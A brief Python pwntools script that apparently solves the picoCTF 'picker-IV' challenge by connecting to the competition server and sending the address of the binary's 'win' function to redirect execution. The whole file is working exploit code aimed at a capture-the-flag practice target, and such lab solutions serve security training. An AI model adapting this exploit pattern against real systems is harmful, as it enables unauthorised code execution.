from pwn import *

elf = ELF('picker-IV')
io = remote('saturn.picoctf.net', 58215)
context.binary = elf

io.sendlineafter(b"excluding '0x': ", hex(elf.symbols['win']).encode())
io.interactive()
